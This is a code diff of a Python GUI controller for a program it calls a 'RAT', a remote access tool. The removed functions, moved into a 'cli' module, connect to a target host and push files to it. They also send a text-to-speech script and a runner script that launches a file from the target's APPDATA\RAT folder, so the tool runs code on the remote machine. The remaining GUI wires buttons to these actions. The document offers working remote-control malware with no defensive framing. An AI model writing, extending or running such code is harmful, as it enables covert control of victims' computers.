@@ -1,125 +1,13 @@
 import PySimpleGUI as sg
 
-import socket
-import tqdm
-import os
-import sys
-
-SEPARATOR = "<SEPARATOR>"
-BUFFER_SIZE = 4096  # send 4096 bytes each time step
-port = None
-host = None
+from cli import *
 
 print("[+] Building GUI")
 
 sg.theme("default1")
 
 
-def connect(host, port):
-    if not host or not port:
-        print("[-] Host or port is not set")
-        return None
-    s = socket.socket()
-
-    print(f"[+] Connecting to {host}:{port}")
-    s.connect((host, port))
-    print("[+] Connected.")
-    return s
-
-
-def send_file(s, filename):
-    filesize = os.path.getsize(filename)
-    s.send(f"{filename}{SEPARATOR}{filesize}".encode())
-
-    # start sending the file
-    progress = tqdm.tqdm(
-        range(filesize),
-        f"Sending {filename}",
-        unit="B",
-        unit_scale=True,
-        unit_divisor=1024,
-    )
-    with open(filename, "rb") as f:
-        while True:
-            # read the bytes from the file
-            bytes_read = f.read(BUFFER_SIZE)
-            if not bytes_read:
-                # file transmitting is done
-                break
-            # we use sendall to assure transimission in
-            # busy networks
-            s.sendall(bytes_read)
-            # update the progress bar
-            progress.update(len(bytes_read))
-    s.close()
-
-
-def send_data(s, data: bytes, name: str):
-    size = sys.getsizeof(data)
-    s.send(f"{name}{SEPARATOR}{size}".encode())
-
-    # start sending the file
-    progress = tqdm.tqdm(
-        range(size), f"Sending {name}", unit="B", unit_scale=True, unit_divisor=1024
-    )
-    with open(os.path.join(os.getenv("Temp"), "rat_data_to_send"), "wb") as f:
-        f.write(data)
-    with open(os.path.join(os.getenv("Temp"), "rat_data_to_send"), "rb") as f:
-        while True:
-            # read the bytes from the file
-            bytes_read = f.read(BUFFER_SIZE)
-            if not bytes_read:
-                # file transmitting is done
-                break
-            # we use sendall to assure transimission in
-            # busy networks
-            s.sendall(bytes_read)
-            # update the progress bar
-            progress.update(len(bytes_read))
-    s.close()
-
-
-def send_tts(tts_text):
-    s = connect(host, port)
-    if not s:
-        return
-    tts = f"""from gtts import gTTS
-import pygame
-
-text = "{tts_text}"
-# generate tts
-pygame.init()
-pygame.mixer.init()
-output = gTTS(text=text, lang="en", tld="co.in")
-output.save(f"tts.mp3")
-
-   
-
-pygame.mixer.music.load("tts.mp3")
-pygame.mixer.music.play()
-pygame.mixer.music.set_volume(1)
-
-while pygame.mixer.music.get_busy():
-   ...
-"""
-    send_data(s, tts.encode(), "tts.py")
-    s.close()
-
-
-def send_runner_code(filename):
-    print(host, port)
-    s = connect(host, port)
-    if not s:
-        return
-    runner = f"""import os
-os.startfile(os.path.join(os.path.join(os.getenv('APPDATA'), "RAT"), "{filename}"))
-"""
-    send_data(s, runner.encode(), "runner.py")
-    s.close()
-
-
 def main():
-    global host, port
     layout_tts = [
         [sg.Text("Wirte your text here: "), sg.InputText(key="tts_text")],
         [sg.Button("Send TTS", key="send_tts")],
@@ -182,7 +70,7 @@ def main():
                 send_tts(text)
             elif event == "send_file":
                 path = values["file_path"]
-                s = connect(host, port)
+                s = connect(get_host(), get_port())
                 if not s:
                     continue
                 send_file(s, path)
@@ -191,9 +79,9 @@ def main():
                 filename = values["file_name"]
                 send_runner_code(filename)
         elif event == "ip" or event == "port":
-            host = values["ip"]
+            set_host(values["ip"])
             if values["port"].isdigit():
-                port = int(values["port"])
+                set_port(values["port"])
 
 
 if __name__ == "__main__":
